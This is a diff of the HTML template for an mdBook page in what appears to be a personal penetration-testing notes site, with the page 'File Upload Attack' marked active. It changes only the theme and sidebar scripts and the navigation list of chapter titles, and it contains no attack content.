@@ -1,5 +1,5 @@
 <!DOCTYPE HTML>
-<html lang="en" class="light sidebar-visible" dir="ltr">
+<html lang="en" class="light" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
@@ -7,7 +7,7 @@
 
 
         <!-- Custom HTML head -->
-
+        
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
@@ -22,42 +22,27 @@
         <link rel="stylesheet" href="../../../../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
         <link rel="stylesheet" href="../../../../theme/pagetoc.css">
 
-
-        <!-- Provide site root and default themes to javascript -->
-        <script>
-            const path_to_root = "../../../../";
-            const default_light_theme = "light";
-            const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../../../searchindex.js";
-        </script>
-        <!-- Start loading toc.js asap -->
-        <script src="../../../../toc.js"></script>
     </head>
-    <body>
-    <div id="mdbook-help-container">
-        <div id="mdbook-help-popup">
-            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
-            <div>
-                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
-                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
-                <p>Press <kbd>?</kbd> to show this help</p>
-                <p>Press <kbd>Esc</kbd> to hide this help</p>
-            </div>
-        </div>
-    </div>
+    <body class="sidebar-visible no-js">
     <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
-                let theme = localStorage.getItem('mdbook-theme');
-                let sidebar = localStorage.getItem('mdbook-sidebar');
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
 
                 if (theme.startsWith('"') && theme.endsWith('"')) {
                     localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
@@ -71,51 +56,70 @@
 
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script>
-            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
-            let theme;
+            var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
-            const html = document.documentElement;
+            var html = document.querySelector('html');
             html.classList.remove('light')
             html.classList.add(theme);
-            html.classList.add("js");
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
         </script>
 
         <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
-                sidebar_toggle.checked = false;
             }
-            if (sidebar === 'visible') {
-                sidebar_toggle.checked = true;
-            } else {
-                html.classList.remove('sidebar-visible');
-            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
-            <!-- populated by js -->
-            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
-            <noscript>
-                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
-            </noscript>
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../introduction.html">Welcome!</a></li><li class="chapter-item expanded "><a href="../../../../attack/index.html"><strong aria-hidden="true">1.</strong> Attack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/index.html"><strong aria-hidden="true">1.1.</strong> AI</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/ai_fundamentals.html"><strong aria-hidden="true">1.1.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/binary_exploitation/index.html"><strong aria-hidden="true">1.2.</strong> Binary Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/binary_exploitation/stack_based_buffer_overflows_linux_x86.html"><strong aria-hidden="true">1.2.1.</strong> Stack-Based Buffer Overflows Linux x86</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.3.</strong> Cloud</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.4.</strong> Crypto</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.5.</strong> GamePwn</div></li><li class="chapter-item "><a href="../../../../attack/hardware_ics/index.html"><strong aria-hidden="true">1.6.</strong> Hardware / ICS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/hardware_ics/hardware_ics_fundamentals.html"><strong aria-hidden="true">1.6.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/index.html"><strong aria-hidden="true">1.7.</strong> Initial Access</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/index.html"><strong aria-hidden="true">1.7.1.</strong> Attacking Common Applications</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/app_discovery_enum.html"><strong aria-hidden="true">1.7.1.1.</strong> Application Discovery & Enum</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_cms.html"><strong aria-hidden="true">1.7.1.2.</strong> CMS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_gateway_interfaces.html"><strong aria-hidden="true">1.7.1.3.</strong> Common Gateway Interfaces</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_management.html"><strong aria-hidden="true">1.7.1.4.</strong> Customer Service / Configuration Management</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_infra_network_tools.html"><strong aria-hidden="true">1.7.1.5.</strong> Infra & Network Tools</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_misc_apps.html"><strong aria-hidden="true">1.7.1.6.</strong> Misc Applications</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_other_apps.html"><strong aria-hidden="true">1.7.1.7.</strong> Other Notable Apps</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_servlet_containers.html"><strong aria-hidden="true">1.7.1.8.</strong> Servlet Containers / Software Dev</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_thick_client.html"><strong aria-hidden="true">1.7.1.9.</strong> Thick Client Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/index.html"><strong aria-hidden="true">1.7.2.</strong> Attacking Common Services</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_common_services_fundamentals.html"><strong aria-hidden="true">1.7.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_dns.html"><strong aria-hidden="true">1.7.2.2.</strong> DNS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_email_services.html"><strong aria-hidden="true">1.7.2.3.</strong> Email Services</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_ftp.html"><strong aria-hidden="true">1.7.2.4.</strong> FTP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_rdp.html"><strong aria-hidden="true">1.7.2.5.</strong> RDP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_smb.html"><strong aria-hidden="true">1.7.2.6.</strong> SMB</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_sql.html"><strong aria-hidden="true">1.7.2.7.</strong> SQL</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/footprinting.html"><strong aria-hidden="true">1.7.3.</strong> Footprinting</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/index.html"><strong aria-hidden="true">1.7.4.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/password_attacks_fundamentals.html"><strong aria-hidden="true">1.7.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.7.4.2.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.7.4.3.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/remote_password_attacks.html"><strong aria-hidden="true">1.7.4.4.</strong> Remote</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.7.4.5.</strong> Windows</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/shells_payloads.html"><strong aria-hidden="true">1.7.5.</strong> Shells & Payloads</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/linux/index.html"><strong aria-hidden="true">1.8.</strong> Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/linux/linux_fundamentals.html"><strong aria-hidden="true">1.8.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/macos/index.html"><strong aria-hidden="true">1.9.</strong> MacOS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/macos/macos_fundamentals.html"><strong aria-hidden="true">1.9.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.10.</strong> Mobile</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.11.</strong> OSINT</div></li><li class="chapter-item "><a href="../../../../attack/pivoting/index.html"><strong aria-hidden="true">1.12.</strong> Pivoting - old</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/pivoting/chisel.html"><strong aria-hidden="true">1.12.1.</strong> Chisel</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ligolo.html"><strong aria-hidden="true">1.12.2.</strong> Ligolo</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/socat.html"><strong aria-hidden="true">1.12.3.</strong> Socat</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ssh_und_proxychains.html"><strong aria-hidden="true">1.12.4.</strong> SSH und Proxychains</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/sshuttle.html"><strong aria-hidden="true">1.12.5.</strong> Sshuttle</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/index.html"><strong aria-hidden="true">1.13.</strong> Post-Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/file_transfers.html"><strong aria-hidden="true">1.13.1.</strong> File Transfers</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/index.html"><strong aria-hidden="true">1.13.2.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.13.2.1.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.13.2.2.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.13.2.3.</strong> Windows</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.13.3.</strong> Persistence</div></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/pivoting.html"><strong aria-hidden="true">1.13.4.</strong> Pivoting</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/index.html"><strong aria-hidden="true">1.13.5.</strong> PrivEsc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/linux_privesc.html"><strong aria-hidden="true">1.13.5.1.</strong> Linux PrivEsc</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/windows_privesc.html"><strong aria-hidden="true">1.13.5.2.</strong> Windows PrivEsc</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.14.</strong> Reversing</div></li><li class="chapter-item "><a href="../../../../attack/tools/index.html"><strong aria-hidden="true">1.15.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/tools/metasploit.html"><strong aria-hidden="true">1.15.1.</strong> Metasploit</a></li><li class="chapter-item "><a href="../../../../attack/tools/nmap.html"><strong aria-hidden="true">1.15.2.</strong> nmap</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/index.html"><strong aria-hidden="true">1.16.</strong> Vuln Scanning</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/vuln_scanning/nessus.html"><strong aria-hidden="true">1.16.1.</strong> Nessus</a></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/openvas.html"><strong aria-hidden="true">1.16.2.</strong> OpenVAS</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/index.html"><strong aria-hidden="true">1.17.</strong> Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/index.html"><strong aria-hidden="true">1.17.1.</strong> 0x00</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/fuzzing_fundamentals.html"><strong aria-hidden="true">1.17.1.1.</strong> Fuzzing</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/http_https_fundamentals.html"><strong aria-hidden="true">1.17.1.2.</strong> HTTP/HTTPs</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_proxy_fundamentals.html"><strong aria-hidden="true">1.17.1.3.</strong> Proxies</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_recon_fundamentals.html"><strong aria-hidden="true">1.17.1.4.</strong> Reconnaissance</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_applications_fundamentals.html"><strong aria-hidden="true">1.17.1.5.</strong> Web Applications</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/index.html"><strong aria-hidden="true">1.17.2.</strong> Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/index.html"><strong aria-hidden="true">1.17.2.1.</strong> Client-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/xss.html"><strong aria-hidden="true">1.17.2.1.1.</strong> XSS</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/index.html"><strong aria-hidden="true">1.17.2.2.</strong> Injections</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/command_injections.html"><strong aria-hidden="true">1.17.2.2.1.</strong> Command Injections</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/sqli.html"><strong aria-hidden="true">1.17.2.2.2.</strong> SQLi</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/server_side/index.html"><strong aria-hidden="true">1.17.2.3.</strong> Server-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/file_inclusion.html"><strong aria-hidden="true">1.17.2.3.1.</strong> File Inclusion</a></li><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/server_side/file_upload_attacks.html" class="active"><strong aria-hidden="true">1.17.2.3.2.</strong> File Upload Attack</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/http_verb_tampering.html"><strong aria-hidden="true">1.17.2.3.3.</strong> HTTP Verb Tampering</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/idor.html"><strong aria-hidden="true">1.17.2.3.4.</strong> IDOR</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssi.html"><strong aria-hidden="true">1.17.2.3.5.</strong> SSI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssrf.html"><strong aria-hidden="true">1.17.2.3.6.</strong> SSRF</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssti.html"><strong aria-hidden="true">1.17.2.3.7.</strong> SSTI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xlst.html"><strong aria-hidden="true">1.17.2.3.8.</strong> XLST</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xxe.html"><strong aria-hidden="true">1.17.2.3.9.</strong> XXE</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/index.html"><strong aria-hidden="true">1.17.2.4.</strong> Web Service & API</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_api.html"><strong aria-hidden="true">1.17.2.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/api_attacks.html"><strong aria-hidden="true">1.17.2.4.2.</strong> APIs</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_attacks.html"><strong aria-hidden="true">1.17.2.4.3.</strong> Web Service</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/authentication/index.html"><strong aria-hidden="true">1.17.3.</strong> Authentication</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/authentication/broken_authentication.html"><strong aria-hidden="true">1.17.3.1.</strong> Broken Authentication</a></li><li class="chapter-item "><a href="../../../../attack/web/authentication/login_brute_forcing.html"><strong aria-hidden="true">1.17.3.2.</strong> Login Brute Forcing</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/cms/index.html"><strong aria-hidden="true">1.17.4.</strong> CMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/cms/cms.html"><strong aria-hidden="true">1.17.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/cms/wordpress.html"><strong aria-hidden="true">1.17.4.2.</strong> Wordpress</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/index.html"><strong aria-hidden="true">1.17.5.</strong> Web Security</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/javascript_deobfuscation.html"><strong aria-hidden="true">1.17.5.1.</strong> JavaScript (De-)Obfuscation</a></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/session_security.html"><strong aria-hidden="true">1.17.5.2.</strong> Session Security</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/windows/index.html"><strong aria-hidden="true">1.18.</strong> Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/windows_fundamentals.html"><strong aria-hidden="true">1.18.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/index.html"><strong aria-hidden="true">1.18.2.</strong> Active Directory</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/intro_ad.html"><strong aria-hidden="true">1.18.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/index.html"><strong aria-hidden="true">1.18.2.2.</strong> Enumeration and (basic) Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_initial_enum.html"><strong aria-hidden="true">1.18.2.2.1.</strong> Initial Enumeration</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_sniffing_for_foothold.html"><strong aria-hidden="true">1.18.2.2.2.</strong> Foothold</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_user_hunting.html"><strong aria-hidden="true">1.18.2.2.3.</strong> User Hunting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_internal_password_spraying.html"><strong aria-hidden="true">1.18.2.2.4.</strong> Internal Password Spraying</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_credentialed_enum_lotl.html"><strong aria-hidden="true">1.18.2.2.5.</strong> Credentialed Enum & LOTL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_kerberoasting.html"><strong aria-hidden="true">1.18.2.2.6.</strong> Kerberoasting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_acl_abuse.html"><strong aria-hidden="true">1.18.2.2.7.</strong> ACL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_extras.html"><strong aria-hidden="true">1.18.2.2.8.</strong> Extras</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_domain_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.9.</strong> Domain Trusts Attacks</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_cross_forest_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.10.</strong> Cross-Forest Trust Attacks</a></li></ol></li></ol></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../../../defend/index.html"><strong aria-hidden="true">2.</strong> Defend</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/index.html"><strong aria-hidden="true">2.1.</strong> Defensive Considerations, Mitigation, Hardening</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/ad_defensive_considerations.html"><strong aria-hidden="true">2.1.1.</strong> AD</a></li><li class="chapter-item "><a href="../../../../defend/defensive_considerations/common_application_hardening.html"><strong aria-hidden="true">2.1.2.</strong> Common Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/digital_forensics/index.html"><strong aria-hidden="true">2.2.</strong> Digital Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/index.html"><strong aria-hidden="true">2.2.1.</strong> Disk Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/windows_event_logs.html"><strong aria-hidden="true">2.2.1.1.</strong> Windows Event Logs</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.2.</strong> Memory Forensics</div></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.3.</strong> Network Forensics</div></li></ol></li><li class="chapter-item "><a href="../../../../defend/incident_response/index.html"><strong aria-hidden="true">2.3.</strong> Incident Response</a></li><li class="chapter-item "><a href="../../../../defend/malware_analysis/index.html"><strong aria-hidden="true">2.4.</strong> Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/malware_analysis/intro_malware_analysis.html"><strong aria-hidden="true">2.4.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/siem/index.html"><strong aria-hidden="true">2.5.</strong> SIEM</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/siem/siem_fundamentals.html"><strong aria-hidden="true">2.5.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.6.</strong> Threat Hunting</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../general/index.html"><strong aria-hidden="true">3.</strong> General</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/index.html"><strong aria-hidden="true">3.1.</strong> Assessments</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/standards.html"><strong aria-hidden="true">3.1.1.</strong> Assessment Standards</a></li><li class="chapter-item "><a href="../../../../general/assessments/security_assessment.html"><strong aria-hidden="true">3.1.2.</strong> Security Assessment</a></li><li class="chapter-item "><a href="../../../../general/assessments/vulnerability_assessment.html"><strong aria-hidden="true">3.1.3.</strong> Vulnerability Assessment</a></li></ol></li><li class="chapter-item "><a href="../../../../general/dbms/index.html"><strong aria-hidden="true">3.2.</strong> DBMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/dbms/dbms_fundamentals.html"><strong aria-hidden="true">3.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/dbms/mysql_fundamentals.html"><strong aria-hidden="true">3.2.2.</strong> MySQL</a></li><li class="chapter-item "><div><strong aria-hidden="true">3.2.3.</strong> Neo4J</div></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/index.html"><strong aria-hidden="true">3.3.</strong> Elastic Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/building_great_search_experiences.html"><strong aria-hidden="true">3.3.1.</strong> Building Great Search Experiences</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/configuring_index_time_series_data.html"><strong aria-hidden="true">3.3.2.</strong> Configuring Elasticsearch Index for Time Series Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/index.html"><strong aria-hidden="true">3.3.3.</strong> Data Analysis with Kibana</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/02_search_your_data.html"><strong aria-hidden="true">3.3.3.1.</strong> Search Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/03_visualize_your_data.html"><strong aria-hidden="true">3.3.3.2.</strong> Visualize Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/04_additional_visualizations.html"><strong aria-hidden="true">3.3.3.3.</strong> Additional Visualizations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/05_present_your_data.html"><strong aria-hidden="true">3.3.3.4.</strong> Present Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/06_analyze_your_data_with_ml.html"><strong aria-hidden="true">3.3.3.5.</strong> Analyze Your Data With Machine Learning</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/07_advanced_kibana.html"><strong aria-hidden="true">3.3.3.6.</strong> Advanced Kibana</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/08_alerting.html"><strong aria-hidden="true">3.3.3.7.</strong> Alerting</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/index.html"><strong aria-hidden="true">3.3.4.</strong> Elasticsearch Engineer</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/01_intro_elasticsearch.html"><strong aria-hidden="true">3.3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/02_data_modelling.html"><strong aria-hidden="true">3.3.4.2.</strong> Data Modelling</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/03_search.html"><strong aria-hidden="true">3.3.4.3.</strong> Search</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/04_aggregations.html"><strong aria-hidden="true">3.3.4.4.</strong> Aggregations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/05_data_processing.html"><strong aria-hidden="true">3.3.4.5.</strong> Data Processing</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/06_distributed_datastore.html"><strong aria-hidden="true">3.3.4.6.</strong> Distributed Datastore</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/07_data_management.html"><strong aria-hidden="true">3.3.4.7.</strong> Data Management</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/08_cluster_management.html"><strong aria-hidden="true">3.3.4.8.</strong> Cluster Management</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/esql_for_security_analysts.html"><strong aria-hidden="true">3.3.5.</strong> ES|QL for Security Analysts</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/kubernetes_basics.html"><strong 